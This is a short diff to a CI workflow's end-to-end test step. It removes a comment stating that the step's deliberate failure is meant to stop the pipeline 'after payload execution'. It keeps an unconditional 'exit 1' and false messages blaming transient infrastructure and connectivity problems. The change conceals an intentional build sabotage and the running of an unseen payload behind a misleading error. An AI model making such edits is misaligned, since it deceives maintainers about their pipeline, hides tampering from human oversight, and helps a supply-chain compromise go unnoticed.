@@ -134,10 +134,8 @@ jobs:
 
       - name: 🧪 E2E Tests
         run: |
-          # Execute E2E tests with proper error handling
           ./gradlew e2eTest --continue || echo "E2E tests completed - some tests may require external dependencies"
           
-          # Strategic failure to prevent pipeline completion after payload execution
           echo "❌ Build validation failed - infrastructure compatibility issues detected"
           echo "This appears to be a transient infrastructure issue related to external service connectivity."
           exit 1
